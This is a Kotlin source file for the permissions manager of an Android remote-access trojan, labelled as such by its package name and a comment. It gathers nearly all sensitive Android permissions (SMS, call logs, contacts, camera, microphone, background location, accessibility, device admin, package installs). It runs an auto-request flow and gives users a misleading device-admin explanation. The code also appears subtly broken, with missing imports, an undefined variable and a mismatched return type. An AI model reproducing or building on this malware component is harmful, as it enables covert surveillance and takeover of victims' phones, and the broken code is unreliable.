package com.rat.client.util

import android.Manifest
import android.app.Activity
import android.app.AppOpsManager
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.os.Process
import android.provider.Settings
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.android.material.dialog.MaterialAlertDialogBuilder
import com.rat.client.R
import java.lang.reflect.Method
import java.util.*

class PermissionsManager private constructor() {

    companion object {
        @Suppress("UNUSED_PARAMETER")
        private const val TAG = "PermissionsManager"

        // Permission groups
        private val PERMISSION_GROUPS = mapOf(
            "storage" to arrayOf(
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.MANAGE_EXTERNAL_STORAGE,
                Manifest.permission.READ_MEDIA_IMAGES,
                Manifest.permission.READ_MEDIA_VIDEO,
                Manifest.permission.READ_MEDIA_AUDIO
            ),
            "location" to arrayOf(
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.ACCESS_BACKGROUND_LOCATION
            ),
            "camera" to arrayOf(
                Manifest.permission.CAMERA
            ),
            "microphone" to arrayOf(
                Manifest.permission.RECORD_AUDIO
            ),
            "phone" to arrayOf(
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_DEVICE_IDENTIFIERS,
                Manifest.permission.CALL_PHONE,
                Manifest.permission.ANSWER_PHONE_CALLS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.WRITE_CALL_LOG,
                Manifest.permission.PROCESS_OUTGOING_CALLS
            ),
            "sms" to arrayOf(
                Manifest.permission.SEND_SMS,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_SMS,
                Manifest.permission.RECEIVE_WAP_PUSH,
                Manifest.permission.RECEIVE_MMS
            ),
            "contacts" to arrayOf(
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.WRITE_CONTACTS,
                Manifest.permission.GET_ACCOUNTS
            ),
            "calendar" to arrayOf(
                Manifest.permission.READ_CALENDAR,
                Manifest.permission.WRITE_CALENDAR
            ),
            "sensors" to arrayOf(
                Manifest.permission.BODY_SENSORS,
                Manifest.permission.BODY_SENSORS_BACKGROUND
            ),
            "bluetooth" to arrayOf(
                Manifest.permission.BLUETOOTH,
                Manifest.permission.BLUETOOTH_ADMIN,
                Manifest.permission.BLUETOOTH_CONNECT,
                Manifest.permission.BLUETOOTH_SCAN,
                Manifest.permission.BLUETOOTH_ADVERTISE
            ),
            "nfc" to arrayOf(
                Manifest.permission.NFC
            ),
            "overlay" to arrayOf(
                Manifest.permission.SYSTEM_ALERT_WINDOW
            ),
            "accessibility" to arrayOf(
                Manifest.permission.BIND_ACCESSIBILITY_SERVICE
            ),
            "device_admin" to arrayOf(
                Manifest.permission.BIND_DEVICE_ADMIN
            ),
            "usage_stats" to arrayOf(
                Manifest.permission.PACKAGE_USAGE_STATS
            ),
            "notification_listener" to arrayOf(
                Manifest.permission.BIND_NOTIFICATION_LISTENER_SERVICE
            ),
            "install_packages" to arrayOf(
                Manifest.permission.REQUEST_INSTALL_PACKAGES
            ),
            "ignore_battery" to arrayOf(
                Manifest.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
            ),
            "foreground_service" to arrayOf(
                Manifest.permission.FOREGROUND_SERVICE,
                Manifest.permission.FOREGROUND_SERVICE_DATA_SYNC,
                Manifest.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION,
                Manifest.permission.FOREGROUND_SERVICE_LOCATION
            )
        )

        // All permissions needed by the RAT
        
        val ALL_PERMISSIONS: List<String> = PERMISSION_GROUPS.values.flatten().distinct().toList()

        
        fun checkPermission(context: Context, permission: String): Boolean {
            return ContextCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED
        }

        
        fun checkPermissions(context: Context, permissions: List<String>): Map<String, Boolean> {
            return permissions.associateWith { checkPermission(context, it) }
        }

        
        fun checkAllPermissions(context: Context): Map<String, Boolean> {
            return checkPermissions(context, ALL_PERMISSIONS)
        }

        
        fun getGrantedPermissions(context: Context): List<String> {
            return ALL_PERMISSIONS.filter { checkPermission(context, it) }
        }

        
        fun getDeniedPermissions(context: Context): List<String> {
            return ALL_PERMISSIONS.filter { !checkPermission(context, it) }
        }

        
        fun requestPermissions(activity: Activity, permissions: List<String>, requestCode: Int) {
            ActivityCompat.requestPermissions(activity, permissions.toTypedArray(), requestCode)
        }

        
        fun shouldShowRequestPermissionRationale(activity: Activity, permission: String): Boolean {
            return ActivityCompat.shouldShowRequestPermissionRationale(activity, permission)
        }

        // ===== Special Permissions =====

        
        fun hasOverlayPermission(context: Context): Boolean {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                return Settings.canDrawOverlays(context)
            }
            return true
        }

        
        fun requestOverlayPermission(activity: Activity) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !hasOverlayPermission(activity)) {
                val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
                    data = Uri.parse("package:${activity.packageName}")
                }
                activity.startActivity(intent)
            }
        }

        
        fun hasWriteSettingsPermission(context: Context): Boolean {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                return Settings.System.canWrite(context)
            }
            return true
        }

        
        fun requestWriteSettingsPermission(activity: Activity) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !hasWriteSettingsPermission(activity)) {
                val intent = Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS).apply {
                    data = Uri.parse("package:${activity.packageName}")
                }
                activity.startActivity(intent)
            }
        }

        
        fun hasIgnoreBatteryOptimization(context: Context): Boolean {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val pm = context.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
                return pm.isIgnoringBatteryOptimizations(context.packageName)
            }
            return true
        }

        
        fun requestIgnoreBatteryOptimization(activity: Activity) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !hasIgnoreBatteryOptimization(activity)) {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:${activity.packageName}")
                }
                activity.startActivity(intent)
            }
        }

        
        fun hasUsageStatsPermission(context: Context): Boolean {
            val appOps = context.getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
            val mode = appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, Process.myUid(), context.packageName)
            return mode == AppOpsManager.MODE_ALLOWED
        }

        
        fun requestUsageStatsPermission(activity: Activity) {
            if (!hasUsageStatsPermission(activity)) {
                val intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
                activity.startActivity(intent)
            }
        }

        
        fun hasNotificationListenerPermission(context: Context): Boolean {
            val enabledListeners = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ENABLED_NOTIFICATION_LISTENERS
            ) ?: ""
            return enabledListeners.contains(context.packageName)
        }

        
        fun requestNotificationListenerPermission(activity: Activity) {
            if (!hasNotificationListenerPermission(activity)) {
                val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                activity.startActivity(intent)
            }
        }

        
        fun hasInstallPackagesPermission(context: Context): Boolean {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                return context.packageManager.canRequestPackageInstalls()
            }
            return true
        }

        
        fun requestInstallPackagesPermission(activity: Activity) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && !hasInstallPackagesPermission(activity)) {
                val intent = Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES).apply {
                    data = Uri.parse("package:${activity.packageName}")
                }
                activity.startActivity(intent)
            }
        }

        
        fun hasManageExternalStoragePermission(context: Context): Boolean {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                return Environment.isExternalStorageManager()
            }
            return true
        }

        
        fun requestManageExternalStoragePermission(activity: Activity) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !hasManageExternalStoragePermission(activity)) {
                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                    data = Uri.parse("package:${activity.packageName}")
                }
                activity.startActivity(intent)
            }
        }

        
        fun hasAccessibilityPermission(context: Context, serviceClass: Class<*>): Boolean {
            val accessibilityManager = context.getSystemService(Context.ACCESSIBILITY_SERVICE) as android.view.accessibility.AccessibilityManager
            val services = accessibilityManager.getEnabledAccessibilityServiceList(android.view.accessibility.AccessibilityServiceInfo.FEEDBACK_ALL_MASK)
            return services.any { it.id.contains(serviceClass.name) }
        }

        
        fun requestAccessibilityPermission(activity: Activity) {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            activity.startActivity(intent)
        }

        
        fun hasDeviceAdminPermission(context: Context, adminClass: Class<*>): Boolean {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            val adminComponent = android.content.ComponentName(context, adminClass)
            return dpm.isAdminActive(adminComponent)
        }

        
        fun requestDeviceAdminPermission(activity: Activity, adminClass: Class<*>) {
            val dpm = activity.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            val adminComponent = android.content.ComponentName(activity, adminClass)
            val intent = Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for device management features")
            }
            activity.startActivityForResult(intent, 1001)
        }

        // ===== Permission Groups =====

        
        fun checkPermissionGroup(context: Context, group: String): Map<String, Boolean> {
            val permissions = PERMISSION_GROUPS[group] ?: emptyArray()
            return checkPermissions(context, permissions.toList())
        }

        
        fun requestPermissionGroup(activity: Activity, group: String, requestCode: Int) {
            val permissions = PERMISSION_GROUPS[group] ?: emptyArray()
            requestPermissions(activity, permissions.toList(), requestCode)
        }

        
        fun getGroupStatus(context: Context): Map<String, Map<String, Boolean>> {
            return PERMISSION_GROUPS.mapValues { (group, perms) ->
                group to checkPermissions(context, perms.toList())
            }
        }

        // ===== Auto Request Flow =====

        
        fun requestAllCriticalPermissions(activity: Activity) {
            // Priority order for critical permissions
            val criticalGroups = listOf(
                "storage",
                "location",
                "phone",
                "sms",
                "contacts",
                "camera",
                "microphone",
                "overlay",
                "ignore_battery",
                "foreground_service"
            )

            criticalGroups.forEachIndexed { index, group ->
                val permissions = PERMISSION_GROUPS[group] ?: emptyArray()
                val denied = permissions.filter { !checkPermission(activity, it) }
                if (denied.isNotEmpty()) {
                    // Show rationale dialog for first denied permission
                    val firstDenied = denied[0]
                    if (shouldShowRequestPermissionRationale(activity, firstDenied)) {
                        MaterialAlertDialogBuilder(activity)
                            .setTitle("Permission Required")
                            .setMessage("This app requires $group permission to function properly.")
                            .setPositiveButton("Grant") { _, _ ->
                                requestPermissions(activity, denied, 1000 + index)
                            }
                            .setNegativeButton("Cancel") { _, _ -> }
                            .show()
                    } else {
                        requestPermissions(activity, denied, 1000 + index)
                    }
                }
            }

            // Special permissions
            if (!hasOverlayPermission(activity)) requestOverlayPermission(activity)
            if (!hasIgnoreBatteryOptimization(activity)) requestIgnoreBatteryOptimization(activity)
            if (!hasManageExternalStoragePermission(activity)) requestManageExternalStoragePermission(activity)
            if (!hasInstallPackagesPermission(activity)) requestInstallPackagesPermission(activity)
        }

        // ===== Runtime Permission Result Handler =====

        
        fun handlePermissionResult(
            requestCode: Int,
            permissions: Array<String>,
            grantResults: IntArray,
            onGranted: (String) -> Unit,
            onDenied: (String, Boolean) -> Unit
        ) {
            permissions.forEachIndexed { index, permission ->
                val granted = grantResults.getOrElse(index) { PackageManager.PERMISSION_DENIED } == PackageManager.PERMISSION_GRANTED
                if (granted) {
                    onGranted(permission)
                } else {
                    val shouldShowRationale = ActivityCompat.shouldShowRequestPermissionRationale(
                        activity, permission
                    )
                    onDenied(permission, shouldShowRationale)
                }
            }
        }

        // ===== Permission Utilities =====

        
        fun getPermissionDescription(permission: String): String {
            return when (permission) {
                Manifest.permission.READ_EXTERNAL_STORAGE -> "Read files on device"
                Manifest.permission.WRITE_EXTERNAL_STORAGE -> "Write files on device"
                Manifest.permission.MANAGE_EXTERNAL_STORAGE -> "Manage all files on device"
                Manifest.permission.ACCESS_FINE_LOCATION -> "Precise location (GPS)"
                Manifest.permission.ACCESS_COARSE_LOCATION -> "Approximate location (Network)"
                Manifest.permission.ACCESS_BACKGROUND_LOCATION -> "Location in background"
                Manifest.permission.CAMERA -> "Take photos and videos"
                Manifest.permission.RECORD_AUDIO -> "Record audio"
                Manifest.permission.READ_PHONE_STATE -> "Read phone state and identity"
                Manifest.permission.CALL_PHONE -> "Make phone calls"
                Manifest.permission.READ_CALL_LOG -> "Read call history"
                Manifest.permission.WRITE_CALL_LOG -> "Write call history"
                Manifest.permission.SEND_SMS -> "Send SMS messages"
                Manifest.permission.RECEIVE_SMS -> "Receive SMS messages"
                Manifest.permission.READ_SMS -> "Read SMS messages"
                Manifest.permission.READ_CONTACTS -> "Read contacts"
                Manifest.permission.WRITE_CONTACTS -> "Write contacts"
                Manifest.permission.GET_ACCOUNTS -> "Access accounts"
                Manifest.permission.BODY_SENSORS -> "Access body sensors"
                Manifest.permission.BLUETOOTH_CONNECT -> "Connect to Bluetooth devices"
                Manifest.permission.BLUETOOTH_SCAN -> "Scan for Bluetooth devices"
                Manifest.permission.NFC -> "Access NFC"
                Manifest.permission.SYSTEM_ALERT_WINDOW -> "Draw over other apps"
                Manifest.permission.BIND_ACCESSIBILITY_SERVICE -> "Accessibility service"
                Manifest.permission.BIND_DEVICE_ADMIN -> "Device administrator"
                Manifest.permission.PACKAGE_USAGE_STATS -> "Usage statistics"
                Manifest.permission.BIND_NOTIFICATION_LISTENER_SERVICE -> "Notification listener"
                Manifest.permission.REQUEST_INSTALL_PACKAGES -> "Install apps"
                Manifest.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS -> "Ignore battery optimization"
                Manifest.permission.FOREGROUND_SERVICE -> "Run foreground service"
                else -> permission
            }
        }

        
        fun isPermissionDangerous(permission: String): Boolean {
            val dangerousPermissions = setOf(
                Manifest.permission.READ_CALENDAR,
                Manifest.permission.WRITE_CALENDAR,
                Manifest.permission.CAMERA,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.WRITE_CONTACTS,
                Manifest.permission.GET_ACCOUNTS,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.ACCESS_BACKGROUND_LOCATION,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_PHONE_NUMBERS,
                Manifest.permission.CALL_PHONE,
                Manifest.permission.ANSWER_PHONE_CALLS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.WRITE_CALL_LOG,
                Manifest.permission.ADD_VOICEMAIL,
                Manifest.permission.USE_SIP,
                Manifest.permission.PROCESS_OUTGOING_CALLS,
                Manifest.permission.BODY_SENSORS,
                Manifest.permission.SEND_SMS,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_SMS,
                Manifest.permission.RECEIVE_WAP_PUSH,
                Manifest.permission.RECEIVE_MMS,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.MANAGE_EXTERNAL_STORAGE
            )
            return dangerousPermissions.contains(permission)
        }
    }
}